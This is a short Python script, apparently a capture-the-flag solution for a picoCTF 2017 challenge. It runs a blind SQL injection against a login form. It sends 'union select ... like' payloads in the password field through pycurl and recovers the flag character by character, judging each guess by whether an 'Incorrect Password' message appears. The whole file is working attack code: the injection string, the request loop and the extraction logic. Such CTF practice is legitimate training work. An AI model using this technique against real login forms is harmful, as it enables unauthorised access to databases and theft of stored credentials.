#!/usr/bin/env python3

from io import StringIO
from io import BytesIO

import re

import pycurl
from urllib.parse import urlencode

import socket





charlist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}?!.@#$%^&*()~-+=,;\"'";
result = "";
'''
result = "NOT__LL_ERRORS_SHOULD_BE_SHOWN_07F_15BE_E68_F0694171000114EC419'"
result = "NOT_ALL_ERRORS_SHOULD_BE_SHOWN_07F_15BE_E68_F0694171000114EC419"
'''
login_failed = "Incorrect Password";

request_start = "username=admin&password=a' union select * from users where pass like '"
request_end = "%"

req = 0
i = 0
while(i < len(charlist) and len(result) <= 63):
	req += 1
	
	char = charlist[i]

	storage = BytesIO()

	c = pycurl.Curl()
	
	c.setopt(c.CONNECTTIMEOUT, 30)
	c.setopt(c.TIMEOUT, 30)
	c.setopt(c.WRITEFUNCTION, storage.write)

	c.setopt(pycurl.URL, 'http://shell2017.picoctf.com:33838/')
	c.setopt(pycurl.POST, 1)
	data = {
		'username': 'admin',
		'password': request_start+result+char+request_end
	}
	c.setopt(pycurl.POSTFIELDS, urlencode(data))

	try:
		c.perform()
		b = storage.getvalue().decode('UTF-8', "replace").replace('\n', '\\n')
		if(login_failed not in b):
			result += charlist[i]
			i = 0
	except pycurl.error:
		i -= 1
		pass

	i += 1


print("Total requests:", req)
print("The flag is:", result)